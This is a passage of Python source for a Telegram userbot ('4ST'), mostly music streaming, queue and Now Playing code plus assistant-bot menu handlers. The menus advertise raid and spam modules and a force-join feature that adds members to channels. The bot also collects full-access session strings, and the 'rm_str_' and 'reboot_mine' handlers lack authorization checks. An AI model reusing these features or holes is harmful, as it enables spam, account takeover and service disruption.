        gc.collect()

async def music_play_next(chat_id: int, client=None, session_user_id: int = None) -> bool:
    mstate = get_music_state(chat_id)
    # Fall back to whichever account is already streaming this chat if the
    # caller (e.g. a stream_end event) didn't pass one explicitly.
    session_user_id = session_user_id or mstate.owner_uid
    async with mstate.lock:
        # Debounce: py-tgcalls can fire stream_end twice for the same
        # ending stream, and a manual .skip can land in the same instant a
        # stream_end is being processed. Without this guard both calls
        # would pop a track off the queue and play it, so the "current"
        # track silently gets skipped again right after it started —
        # looking to the user like the song "didn't play".
        now = time.time()
        if now - mstate.last_advance_ts < 1.5:
            bot_logger("MUSIC_DEBOUNCE", f"Ignoring duplicate advance for chat {chat_id}")
            return mstate.is_playing
        mstate.last_advance_ts = now

        if mstate.loop and mstate.current:
            track = mstate.current
        elif mstate.queue:
            track = mstate.queue.pop(0)
        else:
            mstate.is_playing = False
            mstate.current    = None
            _stop_progress_animator(mstate)
            try:
                tgcalls = _get_session_pytgcalls(session_user_id)
                if tgcalls:
                    await tgcalls.leave_call(chat_id)
            except Exception:
                pass
            mstate.owner_uid = None
            gc.collect()  # jugad #8 — reclaim dead ffmpeg handles when the queue drains
            return False
        if session_user_id is None:
            bot_logger("MUSIC_PLAY_ERR", f"No owning session for chat {chat_id} — cannot advance.")
            mstate.last_error = "generic"
            return False
        ok, reason = await music_play_track(chat_id, track, session_user_id)
        mstate.last_error = reason
    if not ok and client:
        await safe_send_and_track(client, chat_id, _play_failure_text(track.title, reason))
    return ok

def register_stream_end_handler(user_id: int):
    """Attach the stream-end listener to `user_id`'s own PyTgCalls instance.
    Called once per account right after that account's music engine starts,
    since each account now has its own independent PyTgCalls client."""
    tgcalls = pytgcalls_apps.get(user_id)
    if not PYTGCALLS_AVAILABLE or not tgcalls:
        return
    @tgcalls.on_update(pytgcalls_filters.stream_end())
    async def _on_stream_end(client, update):
        try:
            await asyncio.sleep(0.5)
            chat_id = update.chat_id
            ok = await music_play_next(chat_id, client=userbot, session_user_id=user_id)
            if ok:
                # Track auto-advanced (queue/loop) — refresh the Now Playing
                # card in place so the animation continues on the new track.
                mstate = get_music_state(chat_id)
                await show_now_playing(userbot, chat_id, mstate)
        except Exception as e:
            bot_logger("STREAM_END_ERR", str(e))
        finally:
            gc.collect()  # jugad #8 — kill dead ffmpeg process handles every track end

# ══════════════════════════════════════════
# AUTO-LEAVE WHEN EMPTY  +  AUTO-RECONNECT HEALING
# ══════════════════════════════════════════
# Checks every active music call every 20s; if nobody besides the bot itself
# has been in the call for 3 consecutive checks (~60s), it leaves and clears
# the queue so the bot doesn't keep streaming into an empty room forever.
# The same loop doubles as the connection-drop healer (jugad #11): a chat
# whose stream silently died (flaky DC hop, Telegram-side VC hiccup) fails
# get_participants() first — a few failures in a row triggers one automatic
# rejoin-and-resume attempt on the current track before giving up.
_EMPTY_VC_LIMIT = 3
_HEAL_FAIL_LIMIT = 3
_empty_vc_counts = {}
_heal_fail_counts = {}

async def auto_leave_empty_calls_task():
    while True:
        try:
            await asyncio.sleep(20)
            if not PYTGCALLS_AVAILABLE:
                continue
            for chat_id, mstate in list(music_states.items()):
                if not mstate.is_playing:
                    _empty_vc_counts.pop(chat_id, None)
                    _heal_fail_counts.pop(chat_id, None)
                    continue
                tgcalls = _get_session_pytgcalls(mstate.owner_uid)
                if not tgcalls:
                    continue
                try:
                    participants = await tgcalls.get_participants(chat_id)
                    _heal_fail_counts[chat_id] = 0
                except Exception:
                    # Connection-drop auto-heal: a failed participants fetch
                    # while we believe we're playing usually means the call
                    # died underneath us. Try rejoining with the same track
                    # a few times before conceding and clearing state.
                    _heal_fail_counts[chat_id] = _heal_fail_counts.get(chat_id, 0) + 1
                    if _heal_fail_counts[chat_id] >= _HEAL_FAIL_LIMIT and mstate.current and mstate.owner_uid:
                        bot_logger("MUSIC_HEAL", f"Connection looks dead in {chat_id} — attempting auto-reconnect.")
                        try:
                            await tgcalls.leave_call(chat_id)
                        except Exception:
                            pass
                        ok, _reason = await music_play_track(chat_id, mstate.current, mstate.owner_uid)
                        if ok:
                            bot_logger("MUSIC_HEAL", f"Auto-reconnect succeeded for {chat_id}.")
                        else:
                            bot_logger("MUSIC_HEAL", f"Auto-reconnect failed for {chat_id} — giving up.")
                            mstate.is_playing = False
                            mstate.current    = None
                            mstate.queue      = []
                        _heal_fail_counts.pop(chat_id, None)
                    continue
                if participants and len(participants) > 0:
                    _empty_vc_counts[chat_id] = 0
                    continue
                _empty_vc_counts[chat_id] = _empty_vc_counts.get(chat_id, 0) + 1
                if _empty_vc_counts[chat_id] >= _EMPTY_VC_LIMIT:
                    bot_logger("MUSIC_AUTO_LEAVE", f"Voice chat {chat_id} empty — leaving.")
                    try:
                        await tgcalls.leave_call(chat_id)
                    except Exception:
                        pass
                    mstate.is_playing = False
                    mstate.current    = None
                    mstate.queue      = []
                    mstate.owner_uid  = None
                    _empty_vc_counts.pop(chat_id, None)
                    gc.collect()
        except Exception as e:
            bot_logger("MUSIC_AUTO_LEAVE_ERR", str(e))

# ══════════════════════════════════════════
# MUSIC HELPERS
# ══════════════════════════════════════════
def _music_not_available_msg(session_user_id: int = 0):
    """Per-session music availability check.
    Each userbot account must set up its own Pyrogram session for music.
    """
    missing = []
    if not PYRO_AVAILABLE:
        missing.append("pyrogram tgcrypto")
    if not PYTGCALLS_AVAILABLE:
        missing.append("py-tgcalls")
    if not YTDLP_AVAILABLE:
        missing.append("yt-dlp")
    if missing:
        return (f"<blockquote>❌ <b>Music Engine — Missing Packages:</b>\n"
                f"<code>pip install {' '.join(missing)}</code></blockquote>")
    if session_user_id:
        if _get_session_pyro(session_user_id) is None:
            return ("<blockquote>❌ <b>Apna Pyrogram session nahi mila!</b>\n"
                    "Bot /start → 🎵 Music Setup mein apna session add karo.\n"
                    "<i>Dusre ka session use nahi hoga — sab alag hain.</i></blockquote>")
    elif not pyro_app:
        return ("<blockquote>❌ <b>Pyrogram not logged in!</b>\n"
                "Login via bot /start → 🎵 Music Setup</blockquote>")
    return None

def _youtube_rejection_text() -> str:
    # YouTube is now supported via 5-client jugad chain — this is kept
    # only for backward compatibility but should never be shown.
    return (
        "<blockquote>ℹ️ <b>YouTube support active.</b> Try: <code>.play song name</code></blockquote>"
    )

def _play_failure_text(title: str, reason: str = None) -> str:
    t = (title[:44] + "…") if len(title) > 44 else title
    if reason == "not_admin":
        return (
            "<blockquote>"
            "🚫  <b>Can't start voice chat</b>\n"
            "──────────────────────\n"
            f"  <code>{t}</code>\n\n"
            "  Music account needs admin rights.\n"
            "  Enable <b>Manage Video Chats</b> for it,\n"
            "  or start VC manually from chat menu.\n"
            "──────────────────────\n"
            "  <i>Then try .play again</i>"
            "</blockquote>"
        )
    if reason == "no_call":
        return (
            "<blockquote>"
            "📞  <b>Voice chat not active</b>\n"
            "──────────────────────\n"
            "  Start the VC first (chat ⓘ menu →\n"
            "  Start Voice Chat), then <code>.play</code> again.\n"
            "  Or give music account admin rights\n"
            "  to auto-start it.\n"
            "──────────────────────\n"
            "  <i>.play once VC is live</i>"
            "</blockquote>"
        )
    return (
        "<blockquote>"
        "⚡  <b>Stream failed — retrying...</b>\n"
        "──────────────────────\n"
        f"  <code>{t}</code>\n\n"
        "  Temporary glitch. Try again with:\n"
        "  <code>.play</code> or <code>.playforce</code>\n"
        "──────────────────────\n"
        "  <i>Usually resolves on retry</i>"
        "</blockquote>"
    )

# ── Animated "Now Playing" card ─────────────────────────────────────────
_PROGRESS_LEN = 16

def _progress_bar(elapsed: float, duration: int, length: int = _PROGRESS_LEN) -> str:
    if not duration or duration <= 0:
        # Live / unknown duration — sliding pulsing dot
        pos  = int(elapsed) % length
        bar  = "─" * pos + "●" + "─" * (length - pos - 1)
        return bar
    ratio  = max(0.0, min(1.0, elapsed / duration))
    filled = int(round(ratio * length))
    filled = max(0, min(length, filled))
    # Filled portion: solid blocks; head: ◉; unfilled: light dash
    if filled == 0:
        bar = "◉" + "╌" * (length - 1)
    elif filled >= length:
        bar = "━" * length
    else:
        bar = "━" * (filled - 1) + "◉" + "╌" * (length - filled)
    return bar

def _fmt_secs(s: float) -> str:
    s = max(0, int(s))
    m, s = divmod(s, 60)
    h, m = divmod(m, 60)
    return f"{h}:{m:02d}:{s:02d}" if h else f"{m}:{s:02d}"

def _track_elapsed(track: MusicTrack) -> float:
    if track.started_at is None:
        return 0.0
    end_time = track.paused_at if track.paused_at is not None else time.time()
    return max(0.0, end_time - track.started_at)

def _now_playing_text(mstate: ChatMusicState) -> str:
    track = mstate.current
    if not track:
        return "<blockquote>⏹  <b>Nothing playing.</b></blockquote>"

    elapsed = _track_elapsed(track)
    bar     = _progress_bar(elapsed, track.duration)

    if mstate.is_paused:
        status_line = "⏸  <b>PAUSED</b>"
    elif track.is_video:
        status_line = "🎬  <b>STREAMING VIDEO</b>"
    else:
        status_line = "🎧  <b>NOW PLAYING</b>"

    # Title — cap at 44 chars
    title = (track.title[:44] + "…") if len(track.title) > 44 else track.title

    # Requester line
    who_line = f"\n║  👤  <i>{track.requester}</i>" if track.requester else ""

    # Loop + queue badge
    badges = []
    if mstate.loop:
        badges.append("🔁 Loop")
    if mstate.queue:
        badges.append(f"📥 +{len(mstate.queue)}")
    badge_line = f"\n║  " + "  ·  ".join(badges) if badges else ""

    # Duration row
    dur_str = f"{_fmt_secs(elapsed)}  {bar}  {track.duration_str()}"

    source = track.source or "stream"

    return (
        f"<blockquote>╔══〔 🎵 4ST Music Player 〕══╗\n"
        f"║\n"
        f"║  {status_line}\n"
        f"║  🎶  <b>{title}</b>{who_line}\n"
        f"║\n"
        f"║  <code>{dur_str}</code>\n"
        f"║\n"
        f"║  📡  <code>{source}</code>{badge_line}\n"
        f"║\n"
        f"╚══════════════════════╝</blockquote>"
    )


def _vc_control_buttons(chat_id: int, is_paused: bool = False):
    """Inline buttons for VC control — sent by asstbot so callbacks work."""
    cid = str(chat_id)
    return [
        [Button.inline("「⏸️ Pause」",  f"vc_pause:{cid}".encode()),
         Button.inline("「▶️ Resume」", f"vc_resume:{cid}".encode()),
         Button.inline("「🔄 Replay」", f"vc_replay:{cid}".encode())],
        [Button.inline("「⏭️ Skip」",   f"vc_skip:{cid}".encode()),
         Button.inline("「⏹️ Stop」",   f"vc_stop:{cid}".encode()),
         Button.inline("「🚫 End VC」", f"vc_end:{cid}".encode())],
    ]

def _stop_progress_animator(mstate: ChatMusicState):
    task = mstate.animator_task
    mstate.animator_task = None
    if task and not task.done():
        task.cancel()

async def _animate_now_playing(chat_id: int, mstate: ChatMusicState, track: MusicTrack):
    """Edits the live Now Playing card every few seconds so the progress bar
    visibly fills in as the track plays — this is the "animation" for a
    plain-text Telegram message (no native video/gif progress widget)."""
    msg = mstate.now_playing_msg
    if not msg:
        return
    try:
        while True:
            await asyncio.sleep(4)
            if mstate.current is not track or mstate.now_playing_msg is not msg:
                return  # track changed / skipped / stopped under us
            if mstate.is_paused:
                continue  # frozen — no need to keep re-rendering the same bar
            elapsed = _track_elapsed(track)
            if track.duration and elapsed >= track.duration + 2:
                return  # about to advance via stream_end handler anyway
            try:
                await msg.edit(_now_playing_text(mstate), parse_mode='html')
            except Exception:
                pass  # message deleted / not modified / flood-wait — ignore and keep trying
    except asyncio.CancelledError:
        pass

async def show_now_playing(client, chat_id: int, mstate: ChatMusicState, proc_msg=None):
    """Renders/refreshes the Now Playing card for the chat's current track,
    (re)starts the animator task, and stores the message so future edits
    (pause/resume/skip) update this same card instead of spamming new ones.
    Sends a separate control-button card via asstbot so inline callbacks work."""
    _stop_progress_animator(mstate)
    text = _now_playing_text(mstate)
    msg = None
    if proc_msg:
        try:
            await proc_msg.edit(text, parse_mode='html')
            msg = proc_msg
        except Exception:
            msg = None
    if msg is None:
        msg = await safe_send_and_track(client, chat_id, text)
    mstate.now_playing_msg = msg

    # Send inline control buttons via asstbot — only bots can receive callbacks.
    # If asstbot is not in the group, this silently fails (non-fatal).
    if mstate.current is not None and asstbot_started:
        try:
            btns = _vc_control_buttons(chat_id, is_paused=mstate.is_paused)
            ctrl_msg = await asstbot.send_message(
                chat_id,
                f"<b>🎛 Controls</b> — <i>{mstate.current.title[:40]}</i>",
                buttons=btns,
                parse_mode='html',
            )
            mstate.ctrl_msg_id = getattr(ctrl_msg, 'id', None)
        except Exception:
            pass  # asstbot not in group — text-only mode is fine

    if msg and mstate.current is not None:
        mstate.animator_task = asyncio.create_task(
            _animate_now_playing(chat_id, mstate, mstate.current)
        )
    return msg

def _format_queue(mstate: ChatMusicState) -> str:
    lines = ["<blockquote>"]
    total = len(mstate.queue) + (1 if mstate.current else 0)
    lines.append(f"📋  <b>MUSIC QUEUE</b>  ·  {total} track{'s' if total != 1 else ''}\n")
    lines.append("──────────────────────")

    if mstate.current:
        t      = mstate.current
        icon   = "⏸" if mstate.is_paused else "▶️"
        title  = (t.title[:40] + "…") if len(t.title) > 40 else t.title
        lines.append(f"\n{icon}  <b>{title}</b>  <code>[{t.duration_str()}]</code>")
        if mstate.loop:
            lines[-1] += "  🔁"

    if mstate.queue:
        lines.append("\n<b>Up next:</b>")
        for i, t in enumerate(mstate.queue[:12], 1):
            title = (t.title[:38] + "…") if len(t.title) > 38 else t.title
            lines.append(f"  <code>{i:2}.</code>  {title}  <code>[{t.duration_str()}]</code>")
        if len(mstate.queue) > 12:
            lines.append(f"\n  <i>… and {len(mstate.queue) - 12} more</i>")
    elif not mstate.current:
        lines.append("\n  <i>Queue is empty. Use .play to add tracks.</i>")

    lines.append("\n──────────────────────")
    lines.append("<i>.skip  ·  .loop  ·  .mend</i>")
    lines.append("</blockquote>")
    return "\n".join(lines)

# ══════════════════════════════════════════
# ASSISTANT BOT — /start HANDLER
# ══════════════════════════════════════════
def _render_start_menu(sender_id: int, sender=None, is_owner: bool = None):
    """Builds the (about_text, buttons) pair for the /start menu.
    Extracted out of asst_start_handler so the "🔙 Back" button can re-render
    the SAME menu directly (via edit) instead of faking a "/start" text
    message — Telethon's incoming=True listener never sees messages the bot
    sends to itself, so that fake message used to vanish into nothing and
    Back looked broken.
    `is_owner` can be passed in directly by callers (e.g. the callback
    handler) that already computed it; otherwise it's derived here."""
    owner_id    = cfg.get("OWNER_ID", 0)
    owner_uname = cfg.get("OWNER_USERNAME", "").lower()
    if is_owner is None:
        is_owner = (sender_id == owner_id or
                    bool(sender and
                         f"@{getattr(sender, 'username', '')}".lower() == owner_uname
                         and owner_uname))
    is_active   = (sender_id in active_user_ids or is_owner)

    _owner_uname = cfg.get('OWNER_USERNAME', '').lstrip('@')
    _owner_url   = (f"https://t.me/{_owner_uname}" if _owner_uname
                    else f"tg://user?id={cfg.get('OWNER_ID', 1)}")
    _report_url  = cfg.get("HELP_REPORT_LINK") or "https://t.me/Spidyofficial"
    # Per-account music status — each user sees only THEIR OWN Pyrogram
    # session state, not a shared/global one (every account plays its own
    # music through its own session).
    pyro_ok      = bool(cfg.get("PYRO_SESSIONS", {}).get(str(sender_id)))
    music_st     = "🟢 Active" if pyro_ok else "🔴 Not Setup"

    if is_owner:
        about_text = (
            "<blockquote>👑  <b>4ST MASTER CONTROL</b>\n"
            "──────────────────────\n"
            "  Welcome, Emperor. All systems active.\n"
            "  ⚡ Engine: Ultra-Fast Telethon Core\n"
            f"  🎵 Music: {music_st}\n"
            "──────────────────────\n"
            "  Choose an action below.</blockquote>"
        )
        buttons = [
            [Button.inline("🔐 Login / Activate Core", b"login_activate")],
            [Button.inline("🎵 Music Setup",           b"music_setup")],
            [Button.inline("➖ Remove String", b"rm_str"),
             Button.inline("⚡ Active Grid Cores", b"act_users")],
            [Button.inline("🧹 Clean Duplicates", b"clean_dup"),
             Button.inline("🧹 Clean Expired", b"clean_exp")],
            [Button.inline("🔄 Reboot All Cores", b"reboot"),
             Button.inline("📢 Broadcast Panel", b"broadcast_panel")],
            [Button.inline("📸 Set Visual Media", b"set_media"),
             Button.inline("📦 Download ZIP", b"dl_zip")],
            [Button.inline("🔗 Manage Auto-Join Links", b"manage_autojoin"),
             Button.inline("👥 Force Join", b"forcejoin_panel")],
            [Button.inline("🔒 Must Join Settings", b"must_join_panel")],
            [Button.inline(
                f"🔄 Master Sync: {'ON' if cfg.get('MASTER_SYNC', False) else 'OFF'}",
                b"toggle_sync")],
            [Button.url("👑 Owner Profile", _owner_url),
             Button.url("🆘 Help/Report",   _report_url)],
        ]
    elif is_active:
        about_text = (
            "<blockquote>🛡️  <b>4ST ELITE OPERATOR</b>\n"
            "──────────────────────\n"
            "  Engine registered ✓  All modules unlocked.\n"
            f"  🎵 Music: {music_st}\n"
            "──────────────────────\n"
            "  Manage your session below.</blockquote>"
        )
        buttons = [
            [Button.inline("🔐 Login / Activate Core", b"login_activate")],
            [Button.inline("🎵 Music Setup",           b"music_setup")],
            [Button.inline("➖ Remove My String", b"rm_str"),
             Button.inline("🔄 Reboot My Core", b"reboot_mine")],
            [Button.inline("⚡ Active Users", b"act_users")],
            [Button.url("👑 Owner Profile", _owner_url),
             Button.url("🆘 Help/Report",   _report_url)],
        ]
    else:
        about_text = (
            "<blockquote>⚡  <b>4ST PRIME CORE</b>\n"
            "──────────────────────\n"
            "  World's fastest userbot framework.\n"
            "  45+ modules: raid · spam · admin · music\n"
            "  ⚔️ combat · 🎵 music · 🤖 AI · 🛠️ tools\n"
            "──────────────────────\n"
            "  Deploy your core to unlock full power.</blockquote>"
        )
        buttons = [
            [Button.inline("🔐 Login / Activate Core", b"login_activate")],
            [Button.url("👑 OWNER", _owner_url),
             Button.url("🆘 REPORT", _report_url)],
        ]
    return about_text, buttons


async def _send_start_menu(event, sender_id: int, sender=None):
    """Sends the /start menu as a fresh reply (used by the /start command)."""
    about_text, buttons = _render_start_menu(sender_id, sender)
    media_path = cfg.get("START_MEDIA_PATH")
    try:
        try:
            parsed_text, entities = asstbot.parse_mode.parse(about_text)
            entities = inject_premium_emojis(parsed_text, entities, PREMIUM_EMOJI_IDS)
            send_kw = {"formatting_entities": entities, "parse_mode": None, "buttons": buttons}
            if media_path and os.path.exists(str(media_path)):
                await event.reply(parsed_text, file=media_path, **send_kw)
            else:
                await event.reply(parsed_text, **send_kw)
        except Exception:
            if media_path and os.path.exists(str(media_path)):
                await event.reply(about_text, file=media_path, buttons=buttons, parse_mode='html')
            else:
                await event.reply(about_text, buttons=buttons, parse_mode='html')
    except Exception:
        try:
            await event.reply(about_text, parse_mode='html')
        except Exception:
            pass


@asstbot.on(events.NewMessage(incoming=True))
async def asst_start_handler(event):
    if not event.is_private:
        return
    text = (event.text or "").strip()
    if text not in ("/start", "/help"):
        return
    try:
        sender    = await event.get_sender()
        sender_id = event.sender_id
        asyncio.create_task(log_to_channel("BOT_START", {"Command": "/start"}, user_obj=sender))
        if sender_id not in state.active_bot_users:
            state.active_bot_users.add(sender_id)
            cfg["BOT_USERS"] = list(state.active_bot_users)
            save_config(cfg)
            # Trigger auto-join for new users too
            asyncio.create_task(auto_join_and_start(userbot))

        await _send_start_menu(event, sender_id, sender)
    except Exception as _e:
        bot_logger("BOT_START_ERR", str(_e))

# ── Premium emoji injection for the assistant bot ─────────────────────
# asstbot is a bot token but we still inject MessageEntityCustomEmoji
# entities so animated emojis render for premium users viewing the message.
async def _bot_send_premium(target, text: str, buttons=None, reply_to=None):
    """Send a message from asstbot with premium emoji entities injected."""
    try:
        import telethon.tl.types as _tl_types
        parsed_text, entities = asstbot.parse_mode.parse(text)
        pool = PREMIUM_EMOJI_IDS
        entities = inject_premium_emojis(parsed_text, entities, pool)
        kw = {"formatting_entities": entities, "parse_mode": None}
        if buttons:
            kw["buttons"] = buttons
        if reply_to:
            kw["reply_to"] = reply_to
        return await asstbot.send_message(target, parsed_text, **kw)
    except Exception:
        try:
            return await asstbot.send_message(target, text, buttons=buttons,
                                               parse_mode='html', reply_to=reply_to)
        except Exception:
            return None

async def _bot_reply(event, text: str, buttons=None):
    """event.reply with premium emoji entities injected. Falls back to plain HTML."""
    try:
        parsed_text, entities = asstbot.parse_mode.parse(text)
        entities = inject_premium_emojis(parsed_text, entities, PREMIUM_EMOJI_IDS)
        kw = {"formatting_entities": entities, "parse_mode": None}
        if buttons:
            kw["buttons"] = buttons
        return await event.reply(parsed_text, **kw)
    except Exception:
        try:
            return await event.reply(text, buttons=buttons, parse_mode='html')
        except Exception:
            return None

async def _premium_edit(msg, text: str, buttons=None):
    """msg.edit() with premium emoji entities. Falls back to plain HTML."""
    try:
        parsed_text, entities = asstbot.parse_mode.parse(text)
        entities = inject_premium_emojis(parsed_text, entities, PREMIUM_EMOJI_IDS)
        kw = {"formatting_entities": entities, "parse_mode": None}
        if buttons:
            kw["buttons"] = buttons
        return await msg.edit(parsed_text, **kw)
    except Exception:
        try:
            return await msg.edit(text, buttons=buttons, parse_mode='html')
        except Exception:
            return None

async def _safe_bot_edit(event, sender_id, text, buttons=None):
    try:
        # Try to edit existing message with premium emojis
        try:
            parsed_text, entities = asstbot.parse_mode.parse(text)
            pool = PREMIUM_EMOJI_IDS
            entities = inject_premium_emojis(parsed_text, entities, pool)
            await event.edit(parsed_text, buttons=buttons,
                             formatting_entities=entities, parse_mode=None)
            return
        except Exception:
            pass
        await event.edit(text, buttons=buttons, parse_mode='html')
    except Exception:
        try:
            await event.delete()
        except Exception:
            pass
        await _bot_send_premium(sender_id, text, buttons=buttons)

# ══════════════════════════════════════════
# ASSISTANT BOT — CALLBACK HANDLER
# ══════════════════════════════════════════
@asstbot.on(events.CallbackQuery)
async def asst_callback_handler(event):
    asyncio.create_task(event.answer())
    data      = event.data
    sender_id = event.sender_id
    owner_id  = cfg.get("OWNER_ID", 0)
    is_owner  = (sender_id == owner_id)
    sender    = await event.get_sender()
    asyncio.create_task(log_to_channel(
        "BUTTON_CLICK",
        {"Button": data.decode('utf-8', errors='ignore')},
        user_obj=sender
    ))
    try:
        await _asst_callback_inner(event, data, sender_id, owner_id, is_owner)
    except Exception as _err:
        bot_logger("BOT_CB_ERR", f"{data}: {_err}")

async def _asst_callback_inner(event, data, sender_id, owner_id, is_owner):
    # ── MUSIC SETUP ──
    if data == b"music_setup":
        pyro_ok = bool(cfg.get("PYRO_SESSIONS", {}).get(str(sender_id)))
        pyro_st = "🟢 Connected" if pyro_ok else "🔴 Not Connected"
        remove_btn = [Button.inline("🗑 Remove Music Session", b"pyro_remove")] if pyro_ok else []
        await _safe_bot_edit(event, sender_id,
            f"<blockquote>🎵  <b>MUSIC ENGINE SETUP</b>\n"
            f"──────────────────────\n"
            f"  Pyrogram  →  {pyro_st}\n"
            f"\n"
            f"  Music bot uses a Pyrogram session\n"
            f"  to join voice chats & stream audio.\n"
            f"──────────────────────\n"
            f"  Choose login method:</blockquote>",
            buttons=[
                [Button.inline("📱 Login via Phone Number", b"pyro_phone")],
                [Button.inline("🔑 Paste Pyrogram String",  b"pyro_string")],
                remove_btn,
                [Button.inline("🔙 Back", b"back_start")],
            ]
        )

    elif data == b"pyro_phone":
        state.asst_conversation_state[sender_id] = {"step": "pyro_waiting_phone"}
        await _safe_bot_edit(event, sender_id,
            "<blockquote>📱  <b>PHONE LOGIN</b>\n"
            "──────────────────────\n"
            "  Send your number with country code:\n"
            "  Example: <code>+919876543210</code>\n"
            "──────────────────────</blockquote>",
            buttons=[[Button.inline("🔙 Cancel", b"music_setup")]]
        )

    elif data == b"pyro_string":
        state.asst_conversation_state[sender_id] = {"step": "pyro_waiting_string"}
        await _safe_bot_edit(event, sender_id,
            "<blockquote>🔑  <b>PYROGRAM STRING</b>\n"
            "──────────────────────\n"
            "  Paste your Pyrogram session string.\n"
            "  (Starts with BQ...)\n"
            "  Generate: @StringFatherBot\n"
            "──────────────────────</blockquote>",
            buttons=[[Button.inline("🔙 Cancel", b"music_setup")]]
        )

    elif data == b"pyro_remove":
        cfg.setdefault("PYRO_SESSIONS", {}).pop(str(sender_id), None)
        # Legacy single-session field — clear it too if this is the owner,
        # so an old install fully migrates off the global session.
        if sender_id == cfg.get("OWNER_ID", 0):
            cfg["PYRO_SESSION"] = ""
        save_config(cfg)
        # PyTgCalls 2.x has no global stop() — calls are torn down per-chat via
        # leave_call(), and stopping the underlying pyrogram client below is
        # enough to disconnect any active group calls for THIS account only —
        # every account manages its own Pyrogram/PyTgCalls client.
        removed_client = pyro_apps.pop(sender_id, None)
        pytgcalls_apps.pop(sender_id, None)
        try:
            if removed_client:
                await removed_client.stop()
        except Exception:
            pass
        if sender_id == cfg.get("OWNER_ID", 0):
            global pyro_app, pytgcalls_app
            pyro_app      = None
            pytgcalls_app = None
        await _safe_bot_edit(event, sender_id,
            "<blockquote>✅  Music session removed.</blockquote>",
            buttons=[[Button.inline("🔙 Back", b"music_setup")]]
        )

    elif data == b"login_activate":
        await _safe_bot_edit(event, sender_id,
            "<blockquote>🔐  <b>ACTIVATE CORE</b>\n"
            "──────────────────────\n"
            "  📱  Login via phone + OTP\n"
            "  ⚡  Paste Telethon string directly\n"
            "──────────────────────</blockquote>",
            buttons=[
                [Button.inline("📱 Login via Num",    b"login_tel")],
                [Button.inline("⚡ Telethon String", b"add_str")],
                [Button.inline("🔙 Back",             b"back_start")],
            ]
        )

    elif data == b"login_tel":
        state.asst_conversation_state[sender_id] = {"step": "waiting_phone"}
        await _safe_bot_edit(event, sender_id,
            "<blockquote>📱  <b>LOGIN VIA PHONE</b>\n"
            "──────────────────────\n"
            "  Send number with country code:\n"
            "  Example: <code>+919876543210</code>\n"
            "──────────────────────</blockquote>",
            buttons=[[Button.inline("🔙 Cancel", b"login_activate")]]
        )

    elif data == b"add_str":
        state.asst_conversation_state[sender_id] = {"step": "waiting_str"}
        await _safe_bot_edit(event, sender_id,
            "<blockquote>⚡  <b>ADD TELETHON STRING</b>\n"
            "──────────────────────\n"
            "  Paste your Telethon session string:\n"
            "──────────────────────</blockquote>",
            buttons=[[Button.inline("🔙 Cancel", b"login_activate")]]
        )

    elif data == b"act_users":
        users_info = []
        for cl in [userbot] + extra_clients:
            try:
                me = await cl.get_me()
                users_info.append(f"  • <a href='tg://user?id={me.id}'>{me.first_name}</a> ({me.id})")
            except Exception:
                pass
        text = ("<blockquote>⚡ <b>ACTIVE GRID CORES:</b>\n\n" +
                "\n".join(users_info) +
                f"\n\nTotal: {len(users_info)}</blockquote>")
        await _safe_bot_edit(event, sender_id, text,
                             buttons=[[Button.inline("🔙 Back", b"back_start")]])

    elif data == b"rm_str":
        if not is_owner and sender_id not in active_user_ids:
            return
        saved = cfg.get("SAVED_STRINGS", [])
        if not saved:
            await _safe_bot_edit(event, sender_id,
                "<blockquote>❌ No extra strings saved.</blockquote>",
                buttons=[[Button.inline("🔙 Back", b"back_start")]])
            return
        btns = []
        for i, s in enumerate(saved):
            btns.append([Button.inline(f"Remove: {s[:20]}...", f"rm_str_{i}".encode())])
        btns.append([Button.inline("🔙 Back", b"back_start")])
        await _safe_bot_edit(event, sender_id,
            "<blockquote>Select string to remove:</blockquote>", buttons=btns)

    elif data.startswith(b"rm_str_"):
        idx   = int(data.decode().replace("rm_str_", ""))
        saved = cfg.get("SAVED_STRINGS", [])
        if 0 <= idx < len(saved):
            removed = saved.pop(idx)
            cfg["SAVED_STRINGS"] = saved
            save_config(cfg)
            await _safe_bot_edit(event, sender_id,
                f"<blockquote>✅ Removed: <code>{removed[:30]}...</code></blockquote>",
                buttons=[[Button.inline("🔙 Back", b"back_start")]])
        else:
            await _safe_bot_edit(event, sender_id,
                "<blockquote>❌ Invalid index.</blockquote>",
                buttons=[[Button.inline("🔙 Back", b"back_start")]])

    elif data == b"reboot":
        if not is_owner:
            return
        await _safe_bot_edit(event, sender_id,
            "<blockquote>♻️ <b>Rebooting all cores...</b></blockquote>")
        await asyncio.sleep(1)
        os.execv(sys.executable, [sys.executable] + sys.argv)

    elif data == b"reboot_mine":
        await _safe_bot_edit(event, sender_id,
            "<blockquote>♻️ <b>Rebooting...</b></blockquote>")
        await asyncio.sleep(1)
        os.execv(sys.executable, [sys.executable] + sys.argv)

    elif data == b"broadcast_panel":
        if not is_owner:
            return
        await _safe_bot_edit(event, sender_id,
            "<blockquote>📢 <b>BROADCAST PANEL</b>\n\nChoose broadcast target:</blockquote>",
            buttons=[
                [Button.inline("📡 Broadcast to All Cores", b"bcast_cores")],
                [Button.inline("👥 Broadcast to Bot Users", b"bcast_users")],
                [Button.inline("👥 Broadcast to GCs", b"bcast_gc")],
                [Button.inline("🌐 Broadcast to GCs + Users", b"bcast_gc_users")],
                [Button.inline("🔙 Back", b"back_start")],
            ]
        )

    elif data == b"bcast_cores":
        if not is_owner:
            return
        state.asst_conversation_state[sender_id] = {"step": "waiting_bcast"}
        await _safe_bot_edit(event, sender_id,
            "<blockquote>📡 <b>Send broadcast message for all cores:</b></blockquote>",
            buttons=[[Button.inline("🔙 Cancel", b"broadcast_panel")]]
        )

    elif data == b"bcast_users":
        if not is_owner:
            return
        state.asst_conversation_state[sender_id] = {"step": "waiting_bcast_users"}
        await _safe_bot_edit(event, sender_id,
            "<blockquote>👥 <b>Send broadcast message for all bot users:</b></blockquote>",
            buttons=[[Button.inline("🔙 Cancel", b"broadcast_panel")]]
        )


    elif data == b"forcejoin_panel":
        if not is_owner:
            return
        fj_custom = cfg.get("FORCEJOIN_USERS", [])
        fj_text = "\n".join(f"  {i+1}. <code>{u}</code>" for i,u in enumerate(fj_custom)) or "  <i>None set</i>"
        await _safe_bot_edit(event, sender_id,
            f"<blockquote>👥 <b>FORCE JOIN PANEL</b>\n"
            f"──────────────────────\n"
            f"<b>Command:</b> <code>.forcejoin @target [users...]</code>\n"
            f"<b>Effect:</b> Adds members to target channel/group.\n"
            f"Service-bot messages auto-deleted at 0.001s.\n\n"
            f"<b>Custom Users List:</b>\n{fj_text}\n"
            f"──────────────────────\n"
